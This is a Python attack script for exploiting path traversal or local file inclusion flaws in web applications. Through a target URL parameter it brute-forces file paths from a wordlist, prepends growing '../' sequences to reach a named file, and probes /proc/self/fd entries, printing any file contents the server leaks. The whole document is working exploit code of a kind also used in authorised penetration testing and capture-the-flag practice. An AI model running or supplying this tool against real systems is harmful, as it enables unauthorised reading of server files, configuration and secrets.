import requests
import argparse
from termcolor import colored

def defaultconfig(url, headers, errpage, args):
    with open(args.wordlist, 'r') as wordlist:
        for line in wordlist:
            word = line.strip()
            print(colored(f"[~] Trying: {word}", "yellow"))
            req = requests.get(url=url, params={args.param: word}, headers=headers)
            if req.text != errpage.text:
                print(colored("[+] File Found:", "green"))
                print(f"    Path: {word}")
                print(f"    Content: {colored(req.text[:100], 'cyan')}...\n")

def filefinder(url, filename, headers, errpage, args):
    escape = ''
    for i in range(20):
        payload = escape + filename
        req = requests.get(url=url, params={args.param: payload}, headers=headers)
        if req.text != errpage.text:
            print(colored("[+] File Found:", "green"))
            print(f"    Payload: {colored(payload, 'yellow')}")
            print(f"    Response:\n{colored(req.text, 'cyan')}")
            break
        escape += "../"
def fdbrute(url,errpage,args):
    for i in range(30):
        payload = '/proc/self/fd/'+str(i)
        req = requests.get(url=url,headers=headers,params={args.param: payload})
        if req.text != errpage.text:
            print(colored("[+] FD FOUND: ", "green"))
            print(colored(i, "green"))
            print(colored(req.text, "green"))

parser = argparse.ArgumentParser(description="Send a request with filename parameter")
parser.add_argument("-u", "--url", required=True, help="Target URL")
parser.add_argument("-f", "--file", help="Filename to send as parameter")
parser.add_argument("-w", "--wordlist", help="Wordlist to bruteforce")
parser.add_argument("-t", "--token", help="Authentication token")
parser.add_argument("-p", "--param", required=True, help="Parameter for the HTTP request")
parser.add_argument("-m", "--mode", help="Mode: filefinder | defaultconfig")
args = parser.parse_args()

url = args.url
filename = args.file
headers = {"Authorization": f"Bearer {args.token}"} if args.token else {}

errpage = requests.get(url=url, params={args.param: "thisshouldnotexist"}, headers=headers)

if args.mode == "defaultconfig":
    if args.wordlist:
        defaultconfig(url, headers, errpage, args)
    else:
        print(colored("[-] Please provide a wordlist with -w", "red"))

elif args.mode == "filefinder":
    if args.file:
        filefinder(url, filename, headers, errpage, args)
    else:
        print(colored("[-] Please provide a filename with -f", "red"))
elif args.mode == 'fdbrute':
    fdbrute(url,errpage,args)

elif args.mode is None:
    if args.file:
        req = requests.get(url=url, params={args.param: args.file}, headers=headers)
        if req.text != errpage.text:
            print(colored("[+] File Found:", "green"))
            print(req.text)
        else:
            print(colored("[-] File not found", "red"))
    else:
        print(colored("[-] Please provide a filename with -f", "red"))

else:
    print(colored("[-] Invalid mode. Use --mode filefinder or defaultconfig", "red"))
